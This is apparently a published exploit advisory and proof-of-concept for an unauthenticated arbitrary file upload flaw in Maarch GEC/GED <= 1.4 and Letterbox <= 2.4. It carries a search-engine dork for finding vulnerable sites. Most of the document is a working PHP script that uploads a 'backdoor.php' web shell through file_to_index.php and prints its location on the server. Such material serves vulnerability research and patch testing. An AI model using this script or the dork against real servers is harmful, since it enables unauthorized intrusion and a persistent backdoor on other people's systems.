/******************************************************
# Exploit Title: Maarch 1.4 Arbitrary file upload
# Google Dork: intext:"Maarch Maerys Archive v2.1 logo"
# Date: 29/10/2014
# Exploit Author: Adrien Thierry
# Exploit Advisory: http://asylum.seraum.com/Security-Alert-GED-ECM-Maarch-Critical-Vulnerabilities.html
# Vendor Homepage: http://maarch.org
# Software Link: http://downloads.sourceforge.net/project/maarch/Maarch%20Entreprise/Maarch-1.4.zip 
# Version: Maarch GEC <= 1.4 | Maarch Letterbox <= 2.4
# Tested on: Linux / Windows 
******************************************************/

The file "file_to_index.php" is accessible without any authentication to upload a file.

This exploit code is a POC for Maarch Letterbox <= 2.4 and Maarch GEC/GED <= 1.4

Exploit code :

<?php

/* EXPLOIT URL  */
$target_url= "http://website.target/apps/maarch_enterprise/";
/* EMPTY FOR OLDS VERSIONS LIKE LETTERBOX 2.3 */
$indexing_path = "indexing_searching/";
/* TARGET UPLOAD FILE */
$target_file = "file_to_index.php";
/* FILE TO UPLOAD IN SAME PATH AS THIS SCRIPT */
$file = "backdoor.php";
/* NAME, EMPTY WITH LETTERBOX */
$name = "shell";

/* LAUNCHING EXPLOIT */
do_post_request($target_url . $indexing_path . $target_file . "?md5=" . $name, $target_url, $file, $name);

function do_post_request($url, $res, $file, $name)
{
    $data = "";
    $boundary = "---------------------".substr(md5(rand(0,32000)), 0, 10);
    $data .= "--$boundary\n";
    $fileContents = file_get_contents($file);
    $md5 = md5_file($file);
    $ext = pathinfo($file, PATHINFO_EXTENSION);
    $data .= "Content-Disposition: form-data; name=\"file\"; filename=\"file.php\"\n";
    $data .= "Content-Type: text/plain\n";
    $data .= "Content-Transfer-Encoding: binary\n\n";
    $data .= $fileContents."\n";
    $data .= "--$boundary--\n";
    $params = array('http' => array(
    'method' => 'POST',
    'header' => 'Content-Type: multipart/form-data; boundary='.$boundary,
    'content' => $data
    ));

$ctx = stream_context_create($params);
    $fp = fopen($url, 'rb', false, $ctx);
    if (!$fp)
    {
       throw new Exception("Erreur !");
    }
    $response = @stream_get_contents($fp);
    if ($response === false)
    {
       throw new Exception("Erreur !");
    }
    else
    {
        echo "file should be here : ";
            /* LETTERBOX */
            if(count($response) > 1) echo $response;
            /* MAARCH ENTERPRISE | GEC */
            else echo "<a href='" . $res . "tmp/tmp_file_" . $name . "." . $ext . "'>BACKDOOR<a>";

    }
}

?>


